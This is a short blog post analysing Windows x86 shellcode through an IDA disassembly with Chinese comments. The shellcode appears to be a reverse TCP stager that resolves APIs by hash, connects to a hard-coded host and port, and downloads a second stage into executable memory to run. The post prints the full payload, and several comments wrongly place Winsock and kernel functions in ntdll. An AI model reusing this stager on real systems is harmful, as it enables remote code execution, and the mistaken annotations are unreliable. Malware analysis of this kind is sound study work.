---
title: shellcode分析
date: 2021-09-05 16:43:07
tags: windows
---

​	<!--more-->

```asm
.data:00424A30                   loc_424A30:                             ; DATA XREF: _main_0+3D↑o
.data:00424A30 FC                                cld
.data:00424A31 E8 8F 00 00 00                    call    sub_424AC5
.data:00424A36 60                                pusha                   ; pushad
.data:00424A37 31 D2                             xor     edx, edx
.data:00424A39 64 8B 52 30                       mov     edx, fs:[edx+_TEB.ProcessEnvironmentBlock] ; 拿到PEB
.data:00424A3D 8B 52 0C                          mov     edx, [edx+0Ch]  ; +0x00c Ldr  : Ptr32 _PEB_LDR_DATA
.data:00424A40 89 E5                             mov     ebp, esp
.data:00424A42 8B 52 14                          mov     edx, [edx+_PEB_LDR_DATA.InMemoryOrderModuleList.Flink] ; 遍历表
.data:00424A45
.data:00424A45                   loc_424A45:                             ; CODE XREF: .data:00424AC0↓j
.data:00424A45 8B 72 28                          mov     esi, [edx+_LDR_DATA_TABLE_ENTRY.FullDllName.Buffer]
.data:00424A48 31 FF                             xor     edi, edi
.data:00424A4A 0F B7 4A 26                       movzx   ecx, [edx+_LDR_DATA_TABLE_ENTRY.FullDllName.MaximumLength]
.data:00424A4E
.data:00424A4E                   loc_424A4E:                             ; CODE XREF: .data:00424A5D↓j
.data:00424A4E 31 C0                             xor     eax, eax        ; 这一大段包括下面的流程大致是
.data:00424A4E                                                           ; 先找到某个dll文件：这里全是ntdll
.data:00424A4E                                                           ; 然后找里面的函数名，具体操作不明 是根据参数找的
.data:00424A4E                                                           ; 然后调用
.data:00424A50 AC                                lodsb
.data:00424A51 3C 61                             cmp     al, 61h ; 'a'
.data:00424A53 7C 02                             jl      short loc_424A57
.data:00424A55 2C 20                             sub     al, 20h ; ' '
.data:00424A57
.data:00424A57                   loc_424A57:                             ; CODE XREF: .data:00424A53↑j
.data:00424A57 C1 CF 0D                          ror     edi, 0Dh
.data:00424A5A 01 C7                             add     edi, eax
.data:00424A5C 49                                dec     ecx
.data:00424A5D 75 EF                             jnz     short loc_424A4E
.data:00424A5F 52                                push    edx
.data:00424A60 8B 52 10                          mov     edx, [edx+_LDR_DATA_TABLE_ENTRY.Reserved2]
.data:00424A63 57                                push    edi
.data:00424A64 8B 42 3C                          mov     eax, [edx+3Ch]
.data:00424A67 01 D0                             add     eax, edx
.data:00424A69 8B 40 78                          mov     eax, [eax+78h]
.data:00424A6C 85 C0                             test    eax, eax
.data:00424A6E 74 4C                             jz      short loc_424ABC
.data:00424A70 01 D0                             add     eax, edx
.data:00424A72 8B 58 20                          mov     ebx, [eax+20h]
.data:00424A75 50                                push    eax
.data:00424A76 01 D3                             add     ebx, edx
.data:00424A78 8B 48 18                          mov     ecx, [eax+18h]
.data:00424A7B
.data:00424A7B                   loc_424A7B:                             ; CODE XREF: .data:00424A99↓j
.data:00424A7B 85 C9                             test    ecx, ecx
.data:00424A7D 74 3C                             jz      short loc_424ABB
.data:00424A7F 31 FF                             xor     edi, edi
.data:00424A81 49                                dec     ecx
.data:00424A82 8B 34 8B                          mov     esi, [ebx+ecx*4] ; 得到dll的ImageBaseAddress之后
.data:00424A82                                                           ; 找导出的函数名 对应的下标
.data:00424A82                                                           ; 然后再导出函数表内得到函数地址
.data:00424A85 01 D6                             add     esi, edx
.data:00424A87
.data:00424A87                   loc_424A87:                             ; CODE XREF: .data:00424A91↓j
.data:00424A87 31 C0                             xor     eax, eax
.data:00424A89 AC                                lodsb
.data:00424A8A C1 CF 0D                          ror     edi, 0Dh
.data:00424A8D 01 C7                             add     edi, eax
.data:00424A8F 38 E0                             cmp     al, ah
.data:00424A91 75 F4                             jnz     short loc_424A87
.data:00424A93 03 7D F8                          add     edi, [ebp-8]
.data:00424A96 3B 7D 24                          cmp     edi, [ebp+24h]
.data:00424A99 75 E0                             jnz     short loc_424A7B
.data:00424A9B 58                                pop     eax
.data:00424A9C 8B 58 24                          mov     ebx, [eax+24h]
.data:00424A9F 01 D3                             add     ebx, edx
.data:00424AA1 66 8B 0C 4B                       mov     cx, [ebx+ecx*2]
.data:00424AA5 8B 58 1C                          mov     ebx, [eax+1Ch]
.data:00424AA8 01 D3                             add     ebx, edx
.data:00424AAA 8B 04 8B                          mov     eax, [ebx+ecx*4]
.data:00424AAD 01 D0                             add     eax, edx
.data:00424AAF 89 44 24 24                       mov     [esp+24h], eax
.data:00424AB3 5B                                pop     ebx
.data:00424AB4 5B                                pop     ebx
.data:00424AB5 61                                popa
.data:00424AB6 59                                pop     ecx
.data:00424AB7 5A                                pop     edx
.data:00424AB8 51                                push    ecx
.data:00424AB9 FF E0                             jmp     eax             ; 至此调用函数
.data:00424ABB                   ; ---------------------------------------------------------------------------
.data:00424ABB
.data:00424ABB                   loc_424ABB:                             ; CODE XREF: .data:00424A7D↑j
.data:00424ABB 58                                pop     eax
.data:00424ABC
.data:00424ABC                   loc_424ABC:                             ; CODE XREF: .data:00424A6E↑j
.data:00424ABC 5F                                pop     edi
.data:00424ABD 5A                                pop     edx
.data:00424ABE 8B 12                             mov     edx, [edx]
.data:00424AC0 E9 80 FF FF FF                    jmp     loc_424A45
.data:00424AC5
.data:00424AC5                   ; =============== S U B R O U T I N E =======================================
.data:00424AC5
.data:00424AC5
.data:00424AC5                   sub_424AC5      proc near               ; CODE XREF: .data:00424A31↑p
.data:00424AC5
.data:00424AC5                   var_22C         = dword ptr -22Ch
.data:00424AC5
.data:00424AC5 5D                                pop     ebp             ; 取出返回地址
.data:00424AC6 68 33 32 00 00                    push    3233h
.data:00424ACB 68 77 73 32 5F                    push    5F327377h       ; ws2_32
.data:00424AD0 54                                push    esp
.data:00424AD1 68 4C 77 26 07                    push    726774Ch        ; 不清楚这两个参数
.data:00424AD6 89 E8                             mov     eax, ebp
.data:00424AD8 FF D0                             call    eax             ; call 返回地址
.data:00424AD8                                                           ; 内容是找到ntdll.dll里面的LoadLibraryA
.data:00424AD8                                                           ; 函数去加载ws2_32.dll
.data:00424ADA B8 90 01 00 00                    mov     eax, 190h
.data:00424ADF 29 C4                             sub     esp, eax
.data:00424AE1 54                                push    esp
.data:00424AE2 50                                push    eax
.data:00424AE3 68 29 80 6B 00                    push    6B8029h
.data:00424AE8 FF D5                             call    ebp             ; 找ntdll里面的WSAStartup
.data:00424AEA 6A 0A                             push    0Ah
.data:00424AEC
.data:00424AEC                   loc_424AEC:                             ; CODE XREF: sub_424AC5+B1↓j
.data:00424AEC 68 C0 A8 94 80                    push    8094A8C0h
.data:00424AF1 68 02 00 1A 0A                    push    0A1A0002h
.data:00424AF6 89 E6                             mov     esi, esp
.data:00424AF8 50                                push    eax
.data:00424AF9 50                                push    eax
.data:00424AFA 50                                push    eax
.data:00424AFB 50                                push    eax
.data:00424AFC 40                                inc     eax
.data:00424AFD 50                                push    eax
.data:00424AFE 40                                inc     eax
.data:00424AFF 50                                push    eax
.data:00424B00 68 EA 0F DF E0                    push    0E0DF0FEAh
.data:00424B05 FF D5                             call    ebp             ; 找ntdll里面的WSASocketA
.data:00424B07 97                                xchg    eax, edi
.data:00424B08
.data:00424B08                   loc_424B08:                             ; CODE XREF: sub_424AC5+55↓j
.data:00424B08 6A 10                             push    10h
.data:00424B0A 56                                push    esi
.data:00424B0B 57                                push    edi
.data:00424B0C 68 99 A5 74 61                    push    6174A599h
.data:00424B11 FF D5                             call    ebp             ; ntdll里面的connect
.data:00424B13 85 C0                             test    eax, eax
.data:00424B15 74 0A                             jz      short loc_424B21
.data:00424B17 FF 4E 08                          dec     dword ptr [esi+8]
.data:00424B1A 75 EC                             jnz     short loc_424B08
.data:00424B1C
.data:00424B1C                   loc_424B1C:                             ; CODE XREF: sub_424AC5+B7↓j
.data:00424B1C E8 67 00 00 00                    call    loc_424B88
.data:00424B21
.data:00424B21                   loc_424B21:                             ; CODE XREF: sub_424AC5+50↑j
.data:00424B21 6A 00                             push    0
.data:00424B23 6A 04                             push    4
.data:00424B25 56                                push    esi
.data:00424B26 57                                push    edi
.data:00424B27 68 02 D9 C8 5F                    push    5FC8D902h
.data:00424B2C FF D5                             call    ebp             ; ntdll里面的recv
.data:00424B2E 83 F8 00                          cmp     eax, 0
.data:00424B31 7E 36                             jle     short loc_424B69
.data:00424B33 8B 36                             mov     esi, [esi]
.data:00424B35 6A 40                             push    40h ; '@'
.data:00424B37 68 00 10 00 00                    push    1000h
.data:00424B3C 56                                push    esi
.data:00424B3D 6A 00                             push    0
.data:00424B3F 68 58 A4 53 E5                    push    0E553A458h
.data:00424B44 FF D5                             call    ebp             ; ntdll里面的VirtualAlloc
.data:00424B46 93                                xchg    eax, ebx
.data:00424B47 53                                push    ebx
.data:00424B48
.data:00424B48                   loc_424B48:                             ; CODE XREF: sub_424AC5+C0↓j
.data:00424B48 6A 00                             push    0
.data:00424B4A 56                                push    esi
.data:00424B4B 53                                push    ebx
.data:00424B4C 57                                push    edi
.data:00424B4D 68 02 D9 C8 5F                    push    5FC8D902h
.data:00424B52 FF D5                             call    ebp             ; ntdll里面的recv
.data:00424B54 83 F8 00                          cmp     eax, 0
.data:00424B57 7D 28                             jge     short loc_424B81
.data:00424B59 58                                pop     eax
.data:00424B5A 68 00 40 00 00                    push    4000h
.data:00424B5F 6A 00                             push    0
.data:00424B61 50                                push    eax
.data:00424B62 68 0B 2F 0F 30                    push    300F2F0Bh       ; ntdll里面的VirtualFree
.data:00424B67 FF D5                             call    ebp
.data:00424B69
.data:00424B69                   loc_424B69:                             ; CODE XREF: sub_424AC5+6C↑j
.data:00424B69 57                                push    edi
.data:00424B6A 68 75 6E 4D 61                    push    614D6E75h
.data:00424B6F FF D5                             call    ebp             ; ntdll里面的closesocket
.data:00424B71 5E                                pop     esi
.data:00424B72 5E                                pop     esi
.data:00424B73 FF 0C 24                          dec     [esp+22Ch+var_22C]
.data:00424B76 0F 85 70 FF FF FF                 jnz     loc_424AEC
.data:00424B7C E9 9B FF FF FF                    jmp     loc_424B1C
.data:00424B81                   ; ---------------------------------------------------------------------------
.data:00424B81
.data:00424B81                   loc_424B81:                             ; CODE XREF: sub_424AC5+92↑j
.data:00424B81 01 C3                             add     ebx, eax
.data:00424B83 29 C6                             sub     esi, eax
.data:00424B85 75 C1                             jnz     short loc_424B48
.data:00424B87 C3                                retn
.data:00424B87                   sub_424AC5      endp ; sp-analysis failed
.data:00424B87
.data:00424B88                   ; ---------------------------------------------------------------------------
.data:00424B88
.data:00424B88                   loc_424B88:                             ; CODE XREF: sub_424AC5:loc_424B1C↑p
.data:00424B88 BB F0 B5 A2 56                    mov     ebx, 56A2B5F0h
.data:00424B8D 6A 00                             push    0
.data:00424B8F 53                                push    ebx
.data:00424B90 FF D5                             call    ebp

```

